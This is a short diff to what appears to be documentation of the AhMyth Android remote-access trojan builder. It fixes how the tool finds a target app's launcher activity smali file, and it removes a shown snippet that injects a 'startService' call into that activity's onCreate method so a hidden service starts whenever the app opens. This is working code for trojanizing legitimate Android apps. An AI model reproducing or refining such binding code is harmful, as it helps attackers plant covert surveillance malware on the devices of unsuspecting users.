@@ -33,8 +33,8 @@ function GetLauncherPath(manifest, smaliPath) {
 
             if (manifest.indexOf('android:targetActivity="') != -1) {
                 manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
-                manifest = manifest.substring(1, manifest.indexOf('"'))
-                manifest = path.join(smaliPath, manifest) + '.smali';
+                manifest = manifest.substring(0, manifest.indexOf('"'))
+                manifest = manifest.replace(/\./g, "/");
                 manifest = path.join(smaliPath, manifest) + ".smali"
                 return manifest;
 
@@ -61,19 +61,6 @@ function GetLauncherPath(manifest, smaliPath) {
 OrgAppKey2 | Constants.js = Line 32 |
 ```javascript
 exports.orgAppKey2 = ';->onCreate()V';
-```
-
-
-OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
-```javascript
-var key = CONSTANTS.orgAppKey2;
-$appCtrl.Log("Modifiying launcher activity...");
-var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
-fs.writeFile(launcherPath, output, 'utf8', (error) => {
-    if (error) {
-        $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
-        return;
-    }
 ```
     
 Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
